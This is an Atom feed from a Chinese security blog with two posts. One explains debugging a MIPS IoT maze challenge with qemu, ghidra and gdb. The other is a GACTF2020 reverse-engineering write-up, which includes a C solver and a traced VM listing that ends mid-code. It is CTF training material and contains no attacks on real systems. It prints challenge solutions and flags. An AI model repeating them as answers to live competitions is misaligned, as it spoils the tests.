<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bxnop&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.bxnop.cn/"/>
  <updated>2020-09-19T03:34:00.038Z</updated>
  <id>https://www.bxnop.cn/</id>
  
  <author>
    <name>BIX</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iot&amp;mips程序动调&amp;qemu学习&amp;ghidra</title>
    <link href="https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/"/>
    <id>https://www.bxnop.cn/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/</id>
    <published>2020-09-18T14:08:15.000Z</published>
    <updated>2020-09-19T03:34:00.038Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>吾爱师傅发了一篇关于mips程序的逆向，刚接触逆向遇到过但都跳过了，这次遇到正好趁此学习一下。</p></blockquote><a id="more"></a><h2 id="qemu的了解与ghidra"><a href="#qemu的了解与ghidra" class="headerlink" title="qemu的了解与ghidra"></a>qemu的了解与ghidra</h2><p>以该师傅发的iot逆向题目来学习。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919100306144.png" alt="image-20200919100306144">下载后有3个文件，其中一个是提示：</p><blockquote><p><strong>题目运行命令如下:</strong><br><strong>sudo qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append “root=/dev/sda console=tty50”</strong> </p><p><strong>需要分析的程序为 ./bin/maze</strong></p></blockquote><p>了解下qemu：</p><blockquote><p>Qemu  是<strong>纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备</strong>，我们最熟悉的就是能够模拟一台能够独立运行操作系统的虚拟机，虚拟机认为自己和硬件打交道，但其实是和 Qemu 模拟出来的硬件打交道，Qemu 将这些指令转译给真正的硬件。</p></blockquote><p>其实就是qemu可以模拟一些对应程序需要环境来让执行对应的程序。</p><p>经过一番理解后，其实就是使用qemu利用所给的2个文件来模拟openwrt系统来运行，我们知道linux的每个命令都是一个二进制文件，而我们要分析的maze文件也在该命令文件夹中（bin）。</p><p>由于.ext4文件是可以直接解压的，首先将其解压后得到要分析的maze文件。</p><p>查看一下文件信息：32为小端mips的动态链接程序。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919001345047.png" alt="image-20200919001345047"></p><p>执行一下看，发现不能执行，因为这个mips框架的，查资料才知道可以使用qemu来模拟mips环境来执行mips程序。</p><p>题目有提示的，在上面告诉了我们<strong>题目运行命令</strong>：</p><p>所以首先我们是要安装qemu的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>然后进入该模拟的openwrt系统，简单执行一下maze程序，可以看见，还可以进行gdb调试。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200918235617145.png" alt="image-20200918235617145"></p><p>由于ida7.5以下且不使用<code>retdec</code>插件是不能反编译mips框架程序的，知道可以使用ghidra。下载后，找了一个教程学习了下，<a href="https://bbs.pediy.com/thread-251204.htm" target="_blank" rel="noopener">Ghidra使用</a>，其实和ida也总体差不多，上手会很快，但没有ida那么方便。</p><p>由于以前学习java安装过jdk且配置了环境变量，下载该程序后可以直接使用很方便。载入程序：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919002432181.png" alt="image-20200919002432181"></p><p>文件名都是maze（迷宫），且通过伪代码可以很快看清程序流程，这道题也是maze的老套路了，首先生成一个表，然后通过指定字符（U D L R）控制走向，到达一个目的地。</p><p>这里可以通过伪代码计算出该表，但可以直接通过模拟的openwrt系统gdb调试，就调试好了。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003129670.png" alt="image-20200919003129670"></p><p>然后dump出数据：<strong>dump binary memroy dump.txt 0x4110d0 0x411147</strong><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003201998.png" alt="image-20200919003201998"></p><p>C语言按15*8打印一下：</p><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003349559.png" alt="image-20200919003349559"></p><p>最后走一下得结果：DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919003440203.png" alt="image-20200919003440203"></p><h2 id="mips程序的ida动调与gdb调试"><a href="#mips程序的ida动调与gdb调试" class="headerlink" title="mips程序的ida动调与gdb调试"></a>mips程序的ida动调与gdb调试</h2><p>当然到这里肯定是不够的，万一程序没有给能能让该mips程序运行的文件系统，那我们还是自己想办法让程序运行起来进而动调。</p><p>在上面为了模拟openwrt系统运行，已经安装了qemu-user。这时候静态链接的mips程序我们是可以直接执行了，但一般的程序的程序都是动态链接的，我们只要安装好<strong>对应的架构程序的共享库</strong>就好了。<a href="https://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html" target="_blank" rel="noopener">学习安装的文章</a></p><p>首先搜索相关库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search <span class="string">"libc6"</span> | grep mips</span><br></pre></td></tr></table></figure><p><img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919101836969.png" alt="image-20200919101836969"></p><p>这里我们安装程序需要的就行。我为了以后方便将64位与32位的大小端mips程序的共享库都装了：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102119629.png" alt="image-20200919102119629"></p><p>然后运行动态链接的程序要使用完整的命令且指明共享库路径：<strong>-L 指明共享库路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./maze</span><br></pre></td></tr></table></figure><p>但这道题的maze却运行不了，提示：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919102554822.png" alt="image-20200919102554822"></p><p>可以看到，他提示/bin/ld-musl-mipsel-sf.so.1不存在。而这是一个绝对路径，而题目给了文件系统的。所以找到之前解压的.ext4文件，果然才/bin/目录下发现ld-musl-mips-sf.so.1。所以这个的mips的程序应该是指定了共享库的路径了，我们安装32位小端共享库自然不行。</p><p>所以本题的程序要利用所给的共享库，接下来把lib文件夹放在与maze同一级的目录下，然后执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./maze</span><br></pre></td></tr></table></figure><p>还是报错。。但这次是共享库存在了。。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919103541134.png" alt="image-20200919103541134"></p><p>最后在看发这个题的师傅的帖子里看到一个方法：也就是我上面执行失败的解决办法。</p><p>找到/lib/下的2个文件：<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919104238399.png" alt="image-20200919104238399"></p><p>我的理解是像链表一样通过一个文件找到一个文件。这样会导致我们在所给系统外执行该程序，解析失败。解决办法：</p><p>直接删除原文件，将所指的2个文件，重命名为指向他们文件的名称。<strong>也就是ld-musl-mipsel-sf.so.1删除，libc.so重名为ld-musl-mipsel-sf.so.1，另外一个文件同然的操作。</strong></p><p>然后执行成功。<strong>当然对于直接给的一个mips程序，我们用指定的qemu命令并指明共享库就可以执行的了。要是其他架构的程序使用相应的命令即可</strong></p><p>为了调试，我们指定某一个端口开一个GDB调试（-g port）。</p><p>因为以前ida动调端口号都是23946，这里为了ida动调方便也用这个。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919105704723.png" alt="image-20200919105704723"></p><p>现在我们就可以开始调试了，使用gdb与ida都可以。</p><p>首先gdb：</p><ol><li>安装<strong>apt-get install gdb-multiarch</strong></li><li><strong>gdb-multiarch -q ./bin/maze</strong></li><li><strong>set architecture mips</strong>（设置好调试程序的架构）</li><li><strong>set endian little</strong>（设置程序的大小端）</li><li>远程连接调试端口 <strong>target remote :23946</strong>（本地可以不写ip，127.0.0.1）</li></ol><p>ida：与之前的ida的<strong>Remote linux debugger</strong>类似。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919110620683.png" alt="image-20200919110620683"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;吾爱师傅发了一篇关于mips程序的逆向，刚接触逆向遇到过但都跳过了，这次遇到正好趁此学习一下。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>GACTF2020</title>
    <link href="https://www.bxnop.cn/2020/08/30/GACTF2020/"/>
    <id>https://www.bxnop.cn/2020/08/30/GACTF2020/</id>
    <published>2020-08-30T09:25:54.000Z</published>
    <updated>2020-09-14T11:14:29.231Z</updated>
    
    <content type="html"><![CDATA[<p>做了2个逆向及杂项还是有收获。<a id="more"></a></p><h2 id="Reverse："><a href="#Reverse：" class="headerlink" title="Reverse："></a>Reverse：</h2><h3 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h3><p>打开程序，炫酷的界面和音乐。其实就是一个CrackeMe。<img src="/2020/08/30/GACTF2020/image-20200913175304433.png" alt="image-20200913175304433"></p><p>载入ida，直接定位到GetwindowText或者GetDlgItemText函数。<img src="/2020/08/30/GACTF2020/image-20200913174317321.png" alt="image-20200913174317321"></p><p>关键就是那个复杂的if语句根本就执行不到，直接跳过。</p><p>对input进行了xor与ror操作。直接逆即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">78</span>, <span class="number">174</span>,  <span class="number">97</span>, <span class="number">186</span>, <span class="number">228</span>,  <span class="number">43</span>,  <span class="number">85</span>, <span class="number">170</span>,  <span class="number">89</span>, <span class="number">252</span>, </span><br><span class="line">   <span class="number">77</span>,   <span class="number">2</span>,  <span class="number">23</span>, <span class="number">107</span>,  <span class="number">19</span>, <span class="number">161</span>,  <span class="number">65</span>, <span class="number">254</span>,  <span class="number">53</span>,  <span class="number">11</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">11</span>,  <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">70</span>, <span class="number">204</span>,  <span class="number">53</span>, <span class="number">130</span>, <span class="number">229</span>, <span class="number">136</span>, </span><br><span class="line">   <span class="number">80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v37 = <span class="number">6</span>, v38 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, len = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ANNAWGALFYBKVIAHMXTFCAACLAAAAYK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; v37; i++)</span><br><span class="line">v38 *= i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i%<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> ans = ((ida_[i] &gt;&gt; temp) | (ida_[i]&amp;((<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, temp)<span class="number">-1</span>)) &lt;&lt; <span class="number">8</span>-temp) ^ s[i]; <span class="comment">//rol</span></span><br><span class="line"><span class="built_in">putchar</span>(ans ^ v38);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//wannaflag_is_just_a_paper_tiger</span></span><br></pre></td></tr></table></figure><p>最后将其输入程序的输入框，打开解密后的flag文件得到flag。<img src="/2020/08/30/GACTF2020/image-20200913174837508.png" alt="image-20200913174837508"></p><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>ida打开后，main函数sp-analysis failed，简单修复一下栈指针就行。</p><p><img src="/2020/08/30/GACTF2020/image-20200913182620575.png" alt="image-20200913182620575"></p><p>来到main函数，首先是输入一个整型数据，从交叉引用发现对该数据后面并没有使用，猜测对函数代码有一个解密过程。发现后面有一个<strong>mprotect()</strong>函数修改指定内存保护属性，即把要解密的代码的内存改为可写。接着的函数实现解密一个函数代码功能。</p><p>动调来到解密的函数（这里我也反复修了几次，才完美的F5）：一个VM且前面已经申请了存放数据的内存空间和初始化。<img src="/2020/08/30/GACTF2020/image-20200913183634163.png" alt="image-20200913225646159"></p><p>开始是单步调试，由于分支比较多，后面将整个函数与opcode复制到C语言编译器，打印出函数根据opcode的执行情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">13</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">2029229568</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">-2049703936</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">19</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] == <span class="number">653840640</span> ) <span class="built_in">exit</span>(<span class="number">0</span>) <span class="comment">//首先根据输入的整型数据经过运算后与指定值进行比较，不正确则退出。</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input <span class="comment">//下面依次使用输入的整型数据经过运算后存放入dword_804B2A0数组。</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">a1[<span class="number">1</span>] *= a1[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">0</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">8</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">7</span></span><br><span class="line">a1[<span class="number">1</span>] /= a1[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">33</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">1</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">16</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">187</span></span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">2</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">10000</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">160</span></span><br><span class="line">a1[<span class="number">1</span>] -= a1[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">3</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag:"</span>) <span class="comment">//输入flag</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>] <span class="comment">//下面依次对输入的flag的每一位与dword_804B2A0中的数据异或，</span></span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>] </span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">267</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)  <span class="comment">//并与指定数据比较，不相等则退出。</span></span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">122</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">149</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">262</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">125</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">173</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">6</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">357</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">8</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span 